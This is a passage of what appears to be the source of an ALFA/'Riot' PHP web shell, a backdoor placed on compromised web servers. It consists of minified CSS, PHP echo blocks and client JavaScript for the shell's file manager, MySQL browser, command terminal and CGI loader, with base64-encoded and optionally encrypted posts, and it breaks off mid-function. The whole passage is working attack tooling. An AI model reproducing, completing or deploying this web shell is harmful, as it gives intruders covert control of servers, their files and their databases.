.editor-file-name,.menu_options{text-overflow:ellipsis;white-space:nowrap}#myUL,#myUL ul,.mysql-tables ul{list-style-type:none}.hlabale{color:#67abdf;border-radius:4px;border:1px solid #b501f7;margin-left:5px;padding:2px}#tbl_sympphp tr{text-align:center}#PhpCode,.php-evals-ace,.view_ml_content{position:absolute;right:0;bottom:0;left:0;background:#1b292b26;top:50px}#shortcutMenu-holder,.opt-title{left:50%;transform:translate(-50%,-50%)}.editor-view{position:relative;height:100%}.editor-icon,.opt-title,.view-content{position:absolute}.view-content{overflow-y:auto;width:100%;height:93%}::-webkit-scrollbar-track{-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);border-radius:10px;background-color:#000115}::-webkit-scrollbar{width:10px;background-color:#000115}::-webkit-scrollbar-thumb{border-radius:10px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);background-color:#1e82b5}.editor-file-name{margin-left:29px;margin-top:4px;overflow:hidden}.is_active{background:rgba(49,55,93,.77);border-radius:10px}.history-list{height:88%;overflow-y:auto}.opt-title{top:50%;color:#2fd051;font-size:25px;font-family:monospace}.options_min_badge{visibility:hidden;text-align:center;right:30px;color:#fff;background:#2a8a24;padding:6px;border-radius:50%;width:15px;height:15px;display:inline-block;position:absolute;top:-5px}#cgiloader-minimized,#database_window-minimized,#editor-minimized,#options_window-minimized{display:block;position:fixed;right:-30px;width:30px;height:30px;top:30%;z-index:9999}.minimized-wrapper{position:relative;background:#7502ff;width:44px;height:130px;cursor:pointer;border-bottom-left-radius:5px;border-top-left-radius:5px}.minimized-text{transform:rotate(-90deg);color:wheat;font-size:x-large;display:inline-block;position:absolute;right:-51px;width:129px;top:-10px;border-top-left-radius:4%;height:56px;padding:3px}.close-button,.editor-minimize{height:26px;width:38px;right:5px;background:#1d5673;cursor:pointer;position:absolute;box-sizing:border-box;line-height:50px;display:inline-block;top:17px;border-radius:100px}.editor-minimize{right:50px}.close-button:after,.close-button:before,.editor-minimize:before{transform:rotate(-45deg);content:"";position:absolute;top:63%;right:6px;margin-top:-5px;margin-left:-25px;display:block;height:4px;width:27px;background-color:rgba(216,207,207,.75);transition:.25s ease-out}.editor-minimize:before{transform:rotate(0)}.close-button:after{transform:rotate(-135deg)}.close-button:hover:after,.close-button:hover:before,.editor-minimize:hover:before{background-color:red}.close-button:hover,.editor-minimize:hover{background-color:rgba(39,66,80,.96)}#cgiloader,#database_window,#editor,#options_window{display:none;position:fixed;top:0;width:100%;height:100%;z-index:20}.editor-wrapper{width:100%;height:100%;position:relative;top:1%;margin-left:5px}.editor-header{width:97%;background:rgba(21,66,88,.93);background-color:rgba(21,66,88,.93);height:34px;margin-left:20px;position:relative;border-top-left-radius:15px;border-top-right-radius:15px}.editor-explorer,.editor-modal{height:90%;border:2px solid #7502ff}.editor-path{position:absolute;font-size:x-large;margin-left:10px;top:6px;color:#00ff7f}.editor-modal{position:relative;top:0;background-color:rgba(0,1,23,.95);margin-left:20%;margin-right:2%}.editor-explorer{width:19%;background-color:rgba(0,1,23,.94);position:absolute;z-index:2;left:1%}.editor-controller{position:relative;top:-13px}.file-holder{position:relative;width:100%;height:30px}.file-holder>.history{position:absolute;color:#03b3a3;cursor:pointer;left:5px;font-size:18px;font-family:sans-serif;width:89%;height:100%;z-index:3;border-radius:10px;transition:background-color .6s ease-out}.file-holder>.history-close{display:block;opacity:0;position:absolute;right:2px;width:20px;top:4px;text-align:center;cursor:pointer;color:#fff;background:red;border-radius:100px;font-family:monospace;z-index:10;transition:opacity .6s ease-out;font-size:15px;height:19px}.file-holder>.history:hover{background-color:#646464}.editor-explorer>.hheader{position:relative;color:#14ff07;border-bottom:2px solid #206aa2;text-align:center;font-family:sans-serif;margin-bottom:10px;height:55px}.editor-search{position:absolute;bottom:5px;left:31px}.hheader-text{position:absolute;left:8px;top:2px}.history-clear{position:absolute;right:8px;top:2px;cursor:pointer}.editor-body{position:relative;margin-left:3px;height:100%}.editor-anim-close{-webkit-animation:.8s ease-in-out forwards editorClose;-moz-animation:.8s ease-in-out forwards editorClose;-ms-animation:editorClose 0.8s ease-in-out forwards;animation:.8s ease-in-out forwards editorClose}@keyframes editorClose{0%{visibility:1;opacity:1}100%{visibility:0;opacity:0}}.editor-anim-minimize{-webkit-animation:.8s ease-in-out forwards editorMinimize;-moz-animation:.8s ease-in-out forwards editorMinimize;-ms-animation:editorMinimize 0.8s ease-in-out forwards;animation:.8s ease-in-out forwards editorMinimize}@keyframes editorMinimize{0%{right:0;opacity:1}100%{right:-2000px;opacity:0}}.editor-anim-show{-webkit-animation:.8s ease-in-out forwards editorShow;-moz-animation:.8s ease-in-out forwards editorShow;-ms-animation:editorShow 0.8s ease-in-out forwards;animation:.8s ease-in-out forwards editorShow}@keyframes editorShow{0%{right:-2000px;opacity:0}100%{right:0;opacity:1}}.minimized-show{-webkit-animation:.8s ease-in-out forwards minimizeShow;-moz-animation:.8s ease-in-out forwards minimizeShow;-ms-animation:minimizeShow 0.8s ease-in-out forwards;animation:.8s ease-in-out forwards minimizeShow}@keyframes minimizeShow{0%{right:-30px;opacity:0}100%{right:0;opacity:1}}.minimized-hide{-webkit-animation:.8s ease-in-out forwards minimizeHide;-moz-animation:.8s ease-in-out forwards minimizeHide;-ms-animation:minimizeHide 0.8s ease-in-out forwards;animation:.8s ease-in-out forwards minimizeHide}@keyframes minimizeHide{0%{right:0;opacity:1}100%{right:-30px;opacity:0}}.riotexec-text:hover{-webkit-text-shadow:0 0 25px #007bfd;-moz-text-shadow:0 0 25px #007bfd;-ms-text-shadow:0 0 25px #007bfd;text-shadow:0 0 25px #007bfd}.update-holder{position:fixed;top:0;background-color:rgba(0,24,29,.72);width:100%;height:100%}.fmanager-row>td,.update-content{position:relative}.update-content>a{text-decoration:none;position:absolute;color:rgba(103,167,47,.77);left:24%;margin-top:7%;font-size:40px}.update-close{position:absolute;right:0;margin-right:23px;top:10px;font-size:27px;background-color:#130f50;width:5%;border-radius:100px;cursor:pointer;border:2px solid #0e265a}.update-close:hover{border:2px solid #7502ff;color:red}.filestools{height:auto;width:auto;color:#67abdf;font-size:12px;font-family:Verdana,Geneva,sans-serif}@-moz-document url-prefix(){#search-input{width:173px;}.editor-path{top:3px}}.filters-holder{padding:5px 5px 5px 10px}.filters-holder input{width:200px}.filters-holder span{color:#8bc7f7}#rightclick_menu{width:175px;visibility:hidden;opacity:0;position:fixed;background:#7502ff;color:#555;font-family:sans-serif;font-size:11px;-webkit-transition:opacity .5s ease-in-out;-moz-transition:opacity .5s ease-in-out;-ms-transition:opacity .5s ease-in-out;-o-transition:opacity .5s ease-in-out;transition:opacity .5s ease-in-out;-webkit-box-shadow:-1px 0 17px 0 #8b8b8c;-moz-box-shadow:-1px 0 17px 0 #8b8b8c;box-shadow:-1px 0 17px 0 #8b8b8c;padding:0;border:1px solid #737373;border-radius:10px}#rightclick_menu a{display:block;color:#fff;font-weight:bolder;text-decoration:none;padding:6px 8px 6px 40px;position:relative}#rightclick_menu a i.fa,#rightclick_menu a img{height:20px;font-size:17px;width:20px;position:absolute;left:5px;top:2px;padding-left:5px}#rightclick_menu a span{color:#bcb1b3;float:right}#rightclick_menu a:hover{color:#fff;background:#3879d9}#rightclick_menu hr{border:1px solid #ebebeb;border-bottom:0}.cl-popup-fixed{position:fixed;top:0;left:0;width:100%;height:100%;background:#201e1ead}#shortcutMenu-holder{position:absolute;top:40%;background:#1f1e1edb;height:190px;width:500px;color:#fff}#shortcutMenu-holder>.popup-head{background:#207174;padding:6px;border-top:10px;text-align:center;font-family:sans-serif;color:#fff}#shortcutMenu-holder>form{padding:10px}#options_window .content_options_holder .options_holder.option_is_active,#shortcutMenu-holder>form>label,.active,.editor-contents.editor-content-active,.sql-content.sql-active-content{display:block}#shortcutMenu-holder>form>input{width:99%;height:24px;margin-top:4px;color:#fff;outline:0;font-size:16px}#shortcutMenu-holder>.popup-foot{float:right;height:30px;margin-right:8px}#shortcutMenu-holder>.popup-foot>button{height:100%;cursor:pointer;color:#fff;outline:0}.php-terminal-output{overflow:auto;height:85%;border:1px solid #1e5673;border-radius:14px;margin:10px}.cmd-history-holder{visibility:hidden;opacity:0;position:absolute;color:#dff3d5;background:#093d58;top:-300px;height:300px;width:calc(69% + -11px);border-radius:10px 10px 0 0;left:calc(2% - 9px);transition:visibility .5s,opacity .5s linear}.cmd-history-holder .commands-history-header{background:#37504e;text-align:center;border-radius:10px 10px 0 0}.cmd-history-icon{width:27px;top:6px;left:calc(69% + 5px);position:absolute;cursor:pointer}.history-cmd-line{padding:4px;border-bottom:1px dashed;cursor:pointer}.history-cmd-line:hover{background:#961111}#myUL{margin:0;padding:0}.menu_options{display:inline-flex;justify-content:center;align-items:center;width:160px;height:30px;padding:0 10px;font-size:16px;font-weight:700;text-decoration:none;color:#0edf56;background:linear-gradient(135deg,#6a11cb,#0a3d93);border-radius:12px;box-shadow:0 4px 8px rgba(0,0,0,.2);transition:.3s;text-align:center;overflow:hidden}.menu_options:hover{background:linear-gradient(135deg,#2575fc,#6a11cb);transform:scale(1.05);box-shadow:0 6px 12px rgba(0,0,0,.3)}.menu_options:active{transform:scale(.97);box-shadow:0 3px 6px rgba(0,0,0,.2)}.button-container{display:flex;gap:16px;flex-wrap:wrap}.box{cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.box::before{content:"\2610";color:#000;display:inline-block;margin-right:6px}.check-box::before{content:"\2611";color:#1e90ff}.hide-db-tables,.mysql-hide-content,.nested,.terminal-content,.terminal-tab{display:none}.flag-holder>img{width:20px;vertical-align:middle;padding-left:6px}#options_window .content_options_holder .options_holder{position:relative;display:none;overflow:auto;min-height:300px;max-height:calc(100vh - 100px)}#options_window .content_options_holder .options_holder .header{min-height:54vh;margin-left:8px;margin-right:6px}#options_window .content_options_holder .options_tab{padding:5px;margin-left:22px;margin-right:36px;background:#000;border-bottom:5px solid #7502ff;border-left:5px solid #7502ff;border-right:5px solid #7502ff;overflow-x:auto;white-space:nowrap}#filesman_tabs .filesman_tab img,#options_window .content_options_holder .options_tab .tab_name img,.editor-tab-name img,.sql-tabs .sql-tabname img,.terminal-tabs .terminal-tab img{width:10px;vertical-align:middle;margin-left:5px}#filesman_tabs .filesman_tab,#options_window .content_options_holder .options_tab .tab_name,.editor-tab-name,.sql-tabs .sql-newtab,.sql-tabs .sql-tabname,.terminal-tabs .terminal-tab{display:inline-block;background-color:#133d51;border-radius:4px;padding:5px;color:#fff;margin-right:3px;cursor:pointer;margin-bottom:1px;transition:background-color .5s}#a_loader,.options-loader-holder{top:0;left:0;background:#2b2626c7;height:100%;width:100%}#filesman_tabs .filesman_tab{min-width:55px;text-align:center}#filesman_tabs .filesman_tab:hover,#options_window .content_options_holder .options_tab .tab_name:hover,.editor-tab-name:hover,.mysql-query-result-tabs div:hover,.sql-tabs .sql-tabname:hover,.terminal-tabs .terminal-tab:hover{background-color:#a23939}.editor-tabs,.sql-tabs,.terminal-tabs{padding:5px;overflow-x:auto;white-space:nowrap}.history-panel-controller,.stopAjax{padding:10px;color:#fff;cursor:pointer}.options-loader-holder{position:absolute;z-index:11}.options-loader-holder img{position:absolute;top:32%;left:45%;transform:translate(-50%,-50%);width:100px;animation:2s infinite spin}#filesman_tabs .filesman_tab.filesman-tab-active,#options_window .content_options_holder .options_tab .tab_name.tab_is_active,.editor-tab-name.editor-tab-active,.sql-tabname.sql-active-tab,.terminal-tab.active-terminal-tab{background-color:#1e6de4}.tab-is-done{animation:2s step-end infinite tab_change_color}.stopAjax{font-size:20px;display:inline-block}#a_loader{display:none;position:fixed;z-index:99}.fmanager-row .symlink_path{position:fixed;max-width:100%;background-color:#7502ff;border-radius:10px;font-size:15px;padding:8px;color:#fdf4f4;border:1px solid #8a8a8a;z-index:1;pointer-events:none}.archive-icons{vertical-align:middle}.archive-type-dir{font-weight:bolder}.archive-type-file{font-weight:unset}.archive-name{cursor:pointer}.archive_dir_holder a{color:#007bfd;font-weight:bolder;cursor:pointer}.archive_dir_holder a:hover{color:#fff}.editor-content,.terminal-content{height:100%}.editor-content-holder{height:90%}.editor-contents{display:none;position:relative;height:100%}.history-panel-controller{position:absolute;z-index:1000;border-radius:10px;top:50%;left:19%;background-color:#009687}.sql-content{display:none;position:relative;min-height:300px}.pages-holder{padding:5px}.pages-number{display:inline-block;margin-left:10px}.pages-holder .pages-number a.page-number{padding:5px;background:#7502ff;margin-right:8px;cursor:pointer;width:33px;display:inline-block;text-align:center;border-radius:5px;color:#fff;transition:background .5s}.active-page-number{background:#10925c!important}.pages-number a.page-number:hover{background:#8a8a8a}.terminal-content.active-terminal-content{display:block;position:relative}.terminal-btn-fontctl{background:#1e6de4;width:50px;color:#fff;font-weight:bolder;outline:0;cursor:pointer}.alert-area{max-height:100%;position:fixed;bottom:5px;left:20px;right:20px;z-index:9999}.alert-box{font-size:16px;color:#fff;background:rgba(0,0,0,.9);line-height:1.3em;padding:10px 15px;margin:5px 10px;position:relative;border-radius:5px;transition:opacity .5s ease-in;-webkit-animation:.5s ease-in-out alert-shake;animation:.5s ease-in-out alert-shake}.alert-content-title{font-weight:700}.alert-box.alert-success{background:rgba(56,127,56,.89)}.alert-error{background:rgba(191,54,54,.89)}.alert-box.hide{opacity:0}.alert-close{background:0 0;width:12px;height:12px;position:absolute;top:15px;right:15px}.alert-close:after,.alert-close:before{content:"";width:15px;border-top:2px solid #fff;position:absolute;top:5px;right:-1px;display:block}.alert-close:before{transform:rotate(45deg)}.alert-close:after{transform:rotate(135deg)}.alert-close:hover:after,.alert-close:hover:before{border-top:2px solid #d8d8d8}@media (max-width:767px) and (min-width:481px){.alert-area{left:100px;right:100px}}@media (min-width:768px){.alert-area{width:350px;left:auto;right:0;z-index:9999}}@keyframes tab_change_color{0%{background-color:#133d51}50%{background-color:red}}@-webkit-keyframes alert-shake{0%,100%{-webkit-transform:translateX(0)}20%,60%{-webkit-transform:translateX(-10px)}40%,80%{-webkit-transform:translateX(10px)}}.riot-ajax-error,.riotteam-loader-text{position:absolute;transform:translate(-50%,-50%)}@keyframes alert-shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-10px)}40%,80%{transform:translateX(10px)}}.textEffect{position:absolute;width:500px;top:-10px;animation:.5s ease-in-out 2 alert-shake}.riotteam-loader-text{color:#46bb45;top:23%;left:49%;font-size:40px;letter-spacing:5px}.riot-ajax-error{color:#4c1eba;top:50%;left:50%;font-size:30px}.connection-hist-table{margin-left:auto;margin-right:auto;text-align:justify;border-collapse:collapse}.connection-hist-table td,.connection-hist-table th{border:1px solid #ddd;text-align:left;padding:8px}.connection-his-btn{margin-bottom:10px;padding:5px;background:#206920;color:#fff;border:none;outline:0;cursor:pointer;font-weight:700;transition:background .3s}.connection-his-btn.connection-delete{margin:unset;padding:5px;background:red;width:33px;border-radius:3px;transition:background .3s}.connection-delete:hover{background:#f56969!important}.connection-his-btn:hover{background:#30b330}#up_bar_holder{position:fixed;z-index:100000;width:100%}#filesman_tabs{padding:8px;border:5px solid #7502ff;color:#67abdf;overflow-x:auto;white-space:nowrap}.sortable-ghost{opacity:.5;background:#c8ebfb}.folder-tab-icon{width:16px!important}#filesman-tab-full-path{display:none;position:absolute;pointer-events:none;background:#163746;padding:5px;color:#007bfd;border-radius:10px;min-width:58px;z-index:10}#filesman-tab-full-path::after{content:"";position:absolute;top:100%;left:35px;margin-left:-5px;border-width:5px;border-style:solid;pointer-events:none;border-color:#163746 transparent transparent}.mysql-main{height:84vh;position:relative}.mysql-query-result-tabs{margin-bottom:10px;padding:3px;border-bottom:4px solid #7502ff}.mysql-main .tables-panel-ctl{position:absolute;color:#fff;padding:10px;z-index:1;border-radius:10px;top:45%;left:calc(17% + 10px);background-color:#009687;cursor:pointer}.tables-panel-ctl-min{left:-21px!important}.mysql-query-result-tabs div{display:inline-block;padding:5px;margin-right:2px;background:#133d51;color:#fff;cursor:pointer;transition:background-color .5s}.mysql-query-result-tabs div.mysql-query-selected-tab{background:red}table tr.tbl_row:nth-child(odd){background:#424040}.mysql-tables .tables-row{margin-left:26px}.mysql-main .mysql-query-results,.mysql-main .mysql-tables{float:left;height:100%;overflow:auto}.mysql-main .mysql-query-results{width:calc(80% + 4px);margin-left:5px;position:relative;overflow:unset}.mysql-main .mysql-query-results-fixed{width:100%}.mysql-main .mysql-query-results .mysql-query-content{height:89%;overflow:auto}.mysql-query-tab-hide{height:0!important;padding:0!important}.mysql-main .mysql-tables{width:19%;border-right:4px solid #7502ff}.mysql-main table td{vertical-align:top}.mysql-main .mysql-search-area table td{vertical-align:middle;padding:5px}.mysql-tables .block{position:relative;width:1.5em;height:1.5em;min-width:16px;min-height:16px;float:left}.mysql-tables div.block b,.mysql-tables div.block i{width:1.5em;height:1.7em;min-width:16px;min-height:8px;position:absolute;bottom:.7em;left:.75em;z-index:0}.mysql-tables .block i{display:block;border-left:1px solid #666;border-bottom:1px solid #666;position:relative;z-index:0}.mysql-tables .block b{display:block;height:.75em;bottom:0;left:.75em;border-left:1px solid #666}.mysql-tables div.block a,.mysql-tables div.block u{position:absolute;left:50%;top:50%;z-index:10}.mysql-tables div.block img{position:relative;top:-.6em;left:0;margin-left:-5px}.mysql-tables .clearfloat{clear:both}.mysql-tables ul{margin-left:0;padding:0}.mysql-tables ul li{white-space:nowrap;clear:both;min-height:16px}.mysql-tables .db_name{margin-left:10px}.mysql-tables .list_container{border-left:1px solid #666;margin-left:.75em;padding-left:.75em}.mysql-main:after{content:"";display:table;clear:both}table.mysql-data-tbl{border:none!important;border-collapse:collapse!important}table.mysql-data-tbl tr th{padding:5px}table.mysql-data-tbl td{border-left:3px solid #305a8d;border-right:3px solid #305a8d;padding:6px}table.mysql-data-tbl td:first-child{border-left:none}table.mysql-data-tbl td:last-child{border-right:none}.mysql-insert-result,.mysql-structure-qres,.mysql-update-result{display:none;text-align:center;padding:10px;border:1px dashed;margin:22px}#riot-copyright{margin-top:15px}.ic_b_plus{background-image:url(https://dev.artikelspiner.id/icon/b_plus.png)}.ic_b_minus{background-image:url(https://dev.artikelspiner.id/icon/b_minus.png)}
<?php
echo '
@keyframes spin {from {transform: rotate(0deg);}to{transform: rotate(360deg);}}
@-webkit-keyframes spin {from {-webkit-transform: rotate(0deg);}to {-webkit-transform: rotate(360deg);}}
@-moz-keyframes spin {from {-moz-transform: rotate(0deg);}to {-moz-transform: rotate(360deg);}}
@-ms-keyframes spin {from {-ms-transform: rotate(0deg);}to {-ms-transform: rotate(360deg);}}
#riotloader{' .
    $csscode .
    'width:100px;height:100px;}
#a_loader img{' .
    $csscode .
    'width:150px;height:150px;position:fixed;z-index:999999;top: 31%;left: 45%;}
.ajaxarea{display:none;}.up_bar{margin-bottom: 2px;transition:width 2s;background-color:red;width:0;height:8px;display:none;}#hidden_sh{background-color:#7502FF;text-align:center;position:absolute;right:0;left:90%;border-bottom-left-radius:2em}.alert_green{color:#0F0;font-family:"Comic Sans MS";font-size:small;text-decoration:none}.whole{background-color:#000;background-image:url(https://c4.wallpaperflare.com/wallpaper/764/898/536/movie-black-panther-black-panther-marvel-comics-hd-wallpaper-preview.jpg);background-position:center;background-repeat:no-repeat}.header{height:auto;width:auto;border:5px solid #7502FF;color:' .
    riot_getColor("header_values") .
    ';font-size:12px;font-family:Verdana,Geneva,sans-serif}.header a{text-decoration:none;}.filestools a{color:#0F0;text-decoration:none}.filestools a:hover{color:#FFF;text-decoration:none;}span{font-weight:bolder;color:#FFF}.txtfont{font-family:"Comic Sans MS";font-size:small;color:#fff;display:inline-block}.txtfont_header{font-family:"Comic Sans MS";font-size:large;display:inline-block;color:#f00}.tbltxt{font-family:"Comic Sans MS";color:#fff;font-size:small;display:inline-block}input[type="file"]{display:none}.inputfile{border:1px solid #7502FF;background:transparent;box-shadow:0 0 4px #7502FF;border-radius:4px;height:20px;width:250px;text-overflow:ellipsis;white-space:nowrap;cursor:pointer;display:inline-block;overflow:hidden}.inputfile:hover{box-shadow:0 0 4px #B501F7;border:1px solid #B501F7;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}.inputfile span,.inputfile strong{padding:2px;padding-left:10px}.inputfile span{color:#7502FF;width:90px;min-height:2em;display:inline-block;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;vertical-align:top;float:left}.inputfile strong{background-image:url(' .
    __showicon("riotmini") .
    ");background-repeat:no-repeat;background-position:float;height:100%;width:109px;color:#fff;background-color:#7502FF;display:inline-block;float:right}.inputfile:focus strong,.inputfile.has-focus strong,.inputfile:hover strong{background-color:#46647A}.button{padding:3px}#addup,.button{outline:none;cursor:pointer;border:1px solid #7502FF;background:transparent;box-shadow:0 0 4px #7502FF;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px;background-color:#000;color:red;border-radius:100px}#addup:hover,.button:hover{box-shadow:0 0 4px #B501F7;border:1px solid #B501F7;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:disabled:hover{cursor:not-allowed}td{padding:" .
    ($GLOBALS["DB_NAME"]["show_icons"] == "1" ? "0" : "1") .
    'px}.myCheckbox{padding-left:2px}.myCheckbox label{display:inline-block;cursor:pointer;position:relative}.myCheckbox input[type=checkbox]{display:none}.myCheckbox label:before{content:"";display:inline-block;width:14px;height:13px;position:absolute;background-color:#aaa;box-shadow:inset 0 2px 3px 0 rgba(0,0,0,.3),0 1px 0 0 rgba(255,255,255,.8)}.myCheckbox label{margin-bottom:15px;padding-right:17px}.myCheckbox label:before{border-radius:100px}input[type=checkbox]:checked + label:before{content:"";background-color:#7502FF;background-image:url(' .
    __showicon("riotmini") .
    ");background-repeat:no-repeat;background-position:50% 50%;background-size:14px 14px;box-shadow:0 0 4px #0F0}#meunlist{font-family:Verdana,Geneva,sans-serif;color:#FFF;width:auto;border-right-width:5px;border-left-width:5px;height:auto;font-size:12px;font-weight:700;border-top-width:0;border-color:#7502FF;border-style:solid}.whole #meunlist ul{text-align:center;list-style-type:none;margin:0;padding:5px 5px 5px 2px}.whole #meunlist li{margin:0;padding:0;display:inline}.whole #meunlist a {font-family: arial,sans-serif;font-size: 14px;text-decoration: none;font-weight: 100;clear: both;width: 115px;margin-right: 2px;padding: 3px 10px;margin-top: 8px;border: 1px solid #06abfb;font-weight: bold;font-size: 13px;}.foot{font-family:Verdana,Geneva,sans-serif;margin:0;padding:0;width:100%;text-align:center;font-size:12px;color:#7502FF;border-right-width:5px;border-left-width:5px;border-bottom-width:5px;border-bottom-style:solid;border-right-style:solid;border-right-style:solid;border-left-style:solid;border-color:#7502FF;padding-bottom: 12px;}#text{text-align:center}input[type=submit]{cursor:pointer;background-image:url(" .
    __showicon("btn") .
    ');background-repeat:no-repeat;background-position:50% 50%;background-size:23px 23px;background-color:#000;width:30px;height:30px;border:1px solid #B501F7;border-radius:100px}textarea{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #7502FF;background:transparent;box-shadow:0 0 4px #7502FF;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}textarea:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #B501F7;border:1px solid #B501F7;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text],input[type=number],.riot_custom_cmd_btn{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #7502FF;background:transparent;box-shadow:0 0 4px #7502FF;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}input[type=submit]:hover{color:#000;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #B501F7;border:2px solid #B501F7;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #B501F7;border:1px solid #B501F7;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}select{padding:3px;width:162px;color:#FFE;text-shadow:#000 0 2px 5px;border:1px solid #7502FF;background:#000;text-decoration:none;box-shadow:0 0 4px #7502FF;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}select:hover{border:1px solid #B501F7;box-shadow:0 0 4px #B501F7;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}
.foottable{width: 300px;font-weight: bold;' .
    (!@is_writable($GLOBALS["cwd"]) ? "}.dir{background-color:red;}" : "}") .
    ".main th{text-align:left;}.main a{color: #FFF;}.main tr:hover{background-color:#646464 !important;}.ml1{ border:1px solid #7502FF;padding:5px;margin:0;overflow: auto; }.bigarea{ width:99%; height:300px; }.riot_custom_cmd_btn {padding: 5px;color: #24ff03;cursor: pointer;}.ajaxarea.filesman-active-content {display: block;}" .
    riotCssLoadColors() .
    '
</style>';
echo "<script type='text/javascript'>
var c_ = '" .
    htmlspecialchars($GLOBALS["cwd"]) .
    "';
var a_ = '" .
    htmlspecialchars(@$_POST["a"]) .
    "';
var charset_ = '" .
    htmlspecialchars(@$_POST["charset"]) .
    "';
var islinux = " .
    ($GLOBALS["sys"] != "win" ? "true" : "false") .
    ";
var post_encryption_mode = " .
    (__ALFA_POST_ENCRYPTION__ ? "true" : "false") .
    ";";
?>
var riot1_="",riot2_="",riot3_="",riot4_="",riot5_="",riot6_="",riot7_="",riot8_="",riot9_="",riot10_="",d=document,mysql_cache={},editor_files={},editor_error=!0,editor_current_file="",php_temrinal_using_cgi=!1,is_minimized=!1,cgi_is_minimized=!1,options_window_is_minimized=!1,database_window_is_minimized=!1,rightclick_menu_context=null,can_hashchange_work=!0,riot_can_add_opt=!1,riot_before_do_action_id="",riot_ace_editors={editor:null,eval:null},col_dumper_selected_data={},_ALFA_AJAX_={},cgi_lang="",upcount=1,terminal_walk_index=[],riot_current_fm_id=1,riot_fm_id=0;function set(e,a,t,i,l,o,r,n,s,c,f,_,u){d.mf.a.value=null!=e?e:a_,d.mf.c.value=null!=a?a:c_,d.mf.riot1.value=null!=t?t:"",d.mf.riot2.value=null!=i?i:"",d.mf.riot3.value=null!=l?l:"",d.mf.riot4.value=null!=o?o:"",d.mf.riot5.value=null!=r?r:"",d.mf.riot6.value=null!=n?n:"",d.mf.riot7.value=null!=s?s:"",d.mf.riot8.value=null!=c?c:"",d.mf.riot9.value=null!=f?f:"",d.mf.riot10.value=null!=_?_:"",d.mf.charset.value=null!=u?u:charset_}function fc(e){var a=riot_current_fm_id,t="a="+riotb64("FilesMan")+"&c="+riotb64(e.c.value)+"&riot1="+riotb64(e.riot1.value)+"&ajax="+riotb64("true")+"&",i="",l=0;if(d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked&&(l++,i+="f[]="+riotb64(decodeURIComponent(e.value))+"&")}),0==l&&"paste"!=e.riot1.value)return!1;switch(riotloader("filesman_holder_"+a,"block"),e.riot1.value){case"delete":d.querySelectorAll("#filesman_holder_"+a+" .fmanager-row").forEach(function(e){var a=e.querySelector("input[type=checkbox]");a.checked&&".."!=a.value?e.remove():a.checked=!1}),d.querySelector("#filesman_holder_"+a+" .chkbx").checked=!1;break;case"copy":case"move":case"zip":case"unzip":d.querySelectorAll("#filesman_holder_"+a+" input[type=checkbox]:checked").forEach(function(e){e.checked=!1})}_Ajax(d.URL,t+i,function(e){riotloader("filesman_holder_"+a,"none"),riotFmngrContextRow()},!1,"filesman_holder_"+a)}function initDir(e){var a="",t="";islinux&&(a="<a class=\"header_pwd\" onclick=\"g('FilesMan','/');\" path='/' href='#action=fileman&path=/'>/</a>",t="/");var l=e.split("/"),o="",r=islinux?"/":"";for(i in"-1"!=l.indexOf("..")&&(l.splice(l.indexOf("..")-1,1),l.splice(l.indexOf(".."),1)),l)""!=l[i]&&(o+="<a onclick=\"g('FilesMan','"+r+l[i]+"/');\" path='"+r+l[i]+"/' href='#action=fileman&path="+r+l[i]+'/\' class="header_pwd">'+l[i]+"/</a>",r+=l[i]+"/");$("header_cwd").innerHTML=a+o+" ",riotInitCwdContext(),l=(l=t+l.join("/")).replace("//","/"),d.footer_form.c.value=l,$("footer_cwd").value=l,c_=l}function evalJS(html){var newElement=document.createElement("div");newElement.innerHTML=html;for(var scripts=newElement.getElementsByTagName("script"),i=0;i<scripts.length;++i){var script=scripts[i];eval(script.innerHTML)}}function _Ajax(e,a,t,i,l){var o=!1;return window.XMLHttpRequest?o=new XMLHttpRequest:window.ActiveXObject&&(o=new ActiveXObject("Microsoft.XMLHTTP")),void 0!==l&&(_ALFA_AJAX_[l]=o),o?(o.onreadystatechange=function(){4==o.readyState&&200==o.status?"function"==typeof 